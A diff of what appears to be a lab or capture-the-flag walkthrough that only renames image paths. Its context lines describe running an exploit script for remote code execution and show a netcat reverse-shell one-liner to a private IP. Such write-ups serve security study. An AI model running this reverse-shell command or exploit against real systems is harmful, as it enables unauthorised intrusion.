@@ -50,13 +50,13 @@ I registered a new account and found the administrator profile of this instance:
 
 We can use `50108.py` to exploit this. Since we created our own low priv user, we can comment the part of the script that resets the low priv user's password:
 
-<figure><img src="../../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (113) (2).png" alt=""><figcaption></figcaption></figure>
 
 Then, we also need to change the `password` of the low priv user to the one that we used.&#x20;
 
 <figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (39) (2).png" alt=""><figcaption></figcaption></figure>
 
 After running the exploit, we would be given RCE access, and getting a reverse shell is pretty simple:
 
@@ -74,7 +74,7 @@ CMD:> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.184 21 >/tmp
 {"success":false}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (44) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
